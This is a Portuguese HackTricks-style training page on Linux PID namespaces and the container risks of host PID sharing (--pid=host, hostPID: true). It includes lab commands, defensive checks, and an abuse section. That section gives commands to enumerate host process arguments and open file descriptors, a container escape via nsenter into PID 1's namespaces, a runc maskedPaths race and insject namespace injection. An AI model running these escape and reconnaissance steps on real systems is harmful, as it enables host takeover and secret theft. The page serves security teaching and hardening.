# Espaço de nomes PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O PID namespace controla como os processos são numerados e quais processos são visíveis. É por isso que um container pode ter seu próprio PID 1 mesmo que não seja uma máquina real. Dentro do namespace, a workload vê o que parece ser uma árvore de processos local. Fora do namespace, o host ainda vê os PIDs reais do host e todo o panorama de processos.

Do ponto de vista de segurança, o PID namespace importa porque a visibilidade de processos é valiosa. Uma vez que uma workload pode ver processos do host, ela pode ser capaz de observar nomes de serviços, argumentos de linha de comando, segredos passados em argumentos de processo, estado derivado do ambiente através de `/proc`, e potenciais alvos para entrada em namespaces. Se ela pode fazer mais do que apenas ver esses processos, por exemplo enviando sinais ou usando ptrace sob as condições certas, o problema se torna muito mais sério.

## Operação

Um novo PID namespace começa com sua própria numeração interna de processos. O primeiro processo criado dentro dele torna-se PID 1 do ponto de vista do namespace, o que também significa que recebe semânticas especiais tipo init para filhos órfãos e comportamento de sinais. Isso explica muitas das particularidades de containers relacionadas a processos init, recolhimento de processos zumbi, e por que pequenos wrappers init são às vezes usados em containers.

A lição de segurança importante é que um processo pode parecer isolado porque vê apenas sua própria árvore de PIDs, mas esse isolamento pode ser deliberadamente removido. Docker expõe isso através de `--pid=host`, enquanto Kubernetes faz isso através de `hostPID: true`. Uma vez que o container se junta ao PID namespace do host, a workload vê os processos do host diretamente, e muitos caminhos de ataque posteriores tornam-se muito mais realistas.

## Laboratório

Para criar um PID namespace manualmente:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
O shell agora vê uma visão de processos privada. A `--mount-proc` flag é importante porque monta uma instância de procfs que corresponde ao novo PID namespace, tornando a lista de processos coerente de dentro.

Para comparar o comportamento do container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
A diferença é imediata e fácil de entender, por isso este é um bom primeiro laboratório para os leitores.

## Uso em tempo de execução

Containers normais em Docker, Podman, containerd e CRI-O têm seu próprio espaço de nomes PID. Kubernetes Pods normalmente também recebem uma visão de PID isolada, a menos que a carga de trabalho peça explicitamente compartilhamento do PID do host. Ambientes LXC/Incus dependem da mesma primitiva do kernel, embora casos de uso de system-container possam expor árvores de processo mais complicadas e incentivar atalhos de depuração.

A mesma regra se aplica em todos os lugares: se o tempo de execução optou por não isolar o espaço de nomes PID, isso é uma redução deliberada na fronteira do container.

## Misconfigurações

A misconfiguração canônica é o compartilhamento do PID do host. As equipes frequentemente o justificam para depuração, monitoramento ou conveniência de gerenciamento de serviços, mas isso deve sempre ser tratado como uma exceção de segurança significativa. Mesmo que o container não tenha uma primitiva de escrita imediata sobre processos do host, apenas a visibilidade pode revelar muito sobre o sistema. Uma vez que capacidades como `CAP_SYS_PTRACE` ou acesso útil ao procfs sejam adicionadas, o risco aumenta significativamente.

Outro erro é assumir que, porque a carga de trabalho não pode kill ou ptrace processos do host por padrão, o compartilhamento do PID do host é inofensivo. Essa conclusão ignora o valor da enumeração, a disponibilidade de alvos para entrada em namespace, e a forma como a visibilidade de PID se combina com outros controles enfraquecidos.

## Abuso

Se o espaço de nomes PID do host for compartilhado, um atacante pode inspecionar processos do host, coletar argumentos de processo, identificar serviços interessantes, localizar PIDs candidatos para `nsenter`, ou combinar a visibilidade de processos com privilégios relacionados a ptrace para interferir com workloads do host ou vizinhos. Em alguns casos, simplesmente ver o processo de longa duração correto é suficiente para reformular o restante do plano de ataque.

O primeiro passo prático é sempre confirmar que os processos do host estão realmente visíveis:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Uma vez que os PIDs do host estejam visíveis, os argumentos dos processos e os alvos de entry de namespace frequentemente se tornam a fonte de informação mais útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se `nsenter` estiver disponível e houver privilégios suficientes, teste se um processo visível do host pode ser usado como ponte de namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Mesmo quando a entrada é bloqueada, o compartilhamento de PID do host já é valioso porque revela o layout dos serviços, componentes em tempo de execução e processos privilegiados candidatos a serem alvos a seguir.

A visibilidade de PID do host também torna o abuso de descritor de arquivo mais realista. Se um processo privilegiado do host ou uma carga de trabalho vizinha tiver um arquivo sensível ou socket aberto, o atacante pode conseguir inspecionar `/proc/<pid>/fd/` e reutilizar esse descritor conforme a propriedade, as opções de montagem do procfs e o modelo de serviço alvo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Estes comandos são úteis porque respondem se `hidepid=1` ou `hidepid=2` estão reduzindo a visibilidade entre processos e se descritores obviamente interessantes, como arquivos secretos abertos, logs ou Unix sockets, estão visíveis.

### Exemplo completo: host PID + `nsenter`

O compartilhamento do PID do host torna-se um host escape direto quando o processo também tem privilégios suficientes para ingressar nos namespaces do host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se o comando for bem-sucedido, o processo do container agora está executando nos namespaces mount, UTS, network, IPC e PID do host. O impacto é o comprometimento imediato do host.

Mesmo quando `nsenter` está ausente, o mesmo resultado pode ser alcançado através do binário do host se o sistema de arquivos do host estiver montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recentes de tempo de execução

Alguns ataques relevantes ao PID-namespace não são as tradicionais más configurações `hostPID: true`, mas bugs na implementação em tempo de execução relacionados a como as proteções do procfs são aplicadas durante a configuração do container.

#### `maskedPaths` race to host procfs

Em versões vulneráveis do `runc`, atacantes capazes de controlar a imagem do container ou a carga executada por `runc exec` podiam race a fase de mascaramento substituindo o `/dev/null` do container por um symlink para um caminho sensível do procfs, como `/proc/sys/kernel/core_pattern`. Se o race tivesse sucesso, o masked-path bind mount poderia ser aplicado no alvo errado e expor knobs globais do procfs do host ao novo container.

Comando útil para revisão:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Isto é importante porque o impacto eventual pode ser o mesmo que uma exposição direta do procfs: `core_pattern` ou `sysrq-trigger` graváveis, seguida de execução de código no host ou denial of service.

#### Namespace injection with `insject`

Ferramentas de namespace injection, como `insject`, mostram que a interação com o PID-namespace nem sempre exige entrar previamente no namespace de destino antes da criação do processo. Um helper pode anexar-se depois, usar `setns()` e executar preservando a visibilidade no espaço PID do destino:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Esse tipo de técnica importa principalmente para debugging avançado, ferramentas ofensivas e fluxos de trabalho de pós-exploração onde o contexto do namespace deve ser associado depois que o runtime já inicializou a workload.

### Padrões Relacionados de Abuso de FD

Dois padrões valem ser destacados explicitamente quando host PIDs estão visíveis. Primeiro, um processo privilegiado pode manter um descritor de arquivo sensível aberto através de `execve()` porque ele não foi marcado `O_CLOEXEC`. Segundo, serviços podem passar descritores de arquivo por sockets Unix através de `SCM_RIGHTS`. Em ambos os casos, o objeto interessante não é mais o pathname, e sim o handle já aberto que um processo de menor privilégio pode herdar ou receber.

Isso importa em trabalho com containers porque o handle pode apontar para `docker.sock`, um log privilegiado, um arquivo secreto do host, ou outro objeto de alto valor mesmo quando o caminho em si não é diretamente alcançável a partir do sistema de arquivos do container.

## Checks

O objetivo desses comandos é determinar se o processo tem uma visão privada de PID ou se já pode enumerar um panorama de processos muito mais amplo.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Se a lista de processos contém serviços óbvios do host, o compartilhamento de PID com o host provavelmente já está em vigor.
- Ver apenas uma pequena árvore local do container é o comportamento normal; ver `systemd`, `dockerd`, ou daemons não relacionados não é.
- Quando os PIDs do host ficam visíveis, até informações de processos somente leitura tornam-se úteis para reconhecimento.

Se você descobrir um container em execução com compartilhamento de PID do host, não o trate como uma diferença cosmética. É uma mudança importante no que a carga de trabalho pode observar e potencialmente afetar.
{{#include ../../../../../banners/hacktricks-training.md}}
